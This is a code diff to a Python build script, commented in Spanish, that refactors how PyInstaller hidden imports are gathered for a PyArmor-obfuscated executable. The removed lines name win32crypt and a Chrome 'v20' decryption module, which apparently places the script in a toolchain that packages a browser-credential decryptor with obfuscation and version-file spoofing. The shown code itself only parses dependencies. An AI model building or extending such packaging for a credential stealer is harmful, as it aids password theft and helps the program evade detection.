@@ -82,6 +82,32 @@ VSVersionInfo(
         f.write(content)
     return path
 
+def get_dynamic_imports():
+    """Analiza requirements.txt y devuelve lista de modulos para PyInstaller."""
+    translation = {
+        "pycryptodomex": "Cryptodome",
+        "pywin32": "win32crypt",
+        "pillow": "PIL",
+        "pyinstaller": "PyInstaller"
+    }
+    # Dependencias core necesarias para el Builder autónomo que quizás no se importen directamente
+    hidden = ["pyarmor.cli"] 
+    try:
+        if os.path.exists("requirements.txt"):
+            with open("requirements.txt", "r", encoding="utf-8") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith("#"): continue
+                    # Extraer solo el nombre del paquete omitiendo versiones
+                    import re
+                    pkg = re.split(r'[>=<~]', line)[0].strip().lower()
+                    if pkg in ["pytest", "pytest-mock", "pytest-cov"]: continue
+                    hidden.append(translation.get(pkg, pkg))
+    except Exception as e:
+        print(f"[-] Advertencia: No se pudo parsear requirements.txt: {e}")
+    
+    return list(set(hidden))
+
 def main():
     parser = argparse.ArgumentParser(
         description="Suite de Ofuscación y Compilación Robusta (Build Suite)",
@@ -192,12 +218,8 @@ Ejemplos de uso:
         pyi_cmd.extend(["--version-file", v_file])
         
         # --- Universal Dependency Injection ---
-        # Agregamos imports críticos para que el EXE sea un Constructor Autónomo
-        hidden_imports = [
-            "win32crypt", "Cryptodome", "requests", "customtkinter",
-            "PIL", "modules.chrome_v20_decryption.v20_decryptor",
-            "PyInstaller", "pyarmor", "pyarmor.cli"
-        ]
+        # Extraemos imports del requirements.txt dinámicamente
+        hidden_imports = get_dynamic_imports()
         for imp in hidden_imports:
             pyi_cmd.extend(["--hidden-import", imp])
             
@@ -236,10 +258,7 @@ Ejemplos de uso:
 
             # --- Step 2: Run PyInstaller directly on the obfuscated output ---
             v_file = create_version_file(args)
-            hidden_imports = [
-                "win32crypt", "Cryptodome", "requests", "customtkinter", 
-                "PIL", "modules.chrome_v20_decryption.v20_decryptor"
-            ]
+            hidden_imports = get_dynamic_imports()
 
             pyi_cmd = [python, "-m", "PyInstaller", obf_script]
             pyi_cmd += ["--name", args.name]
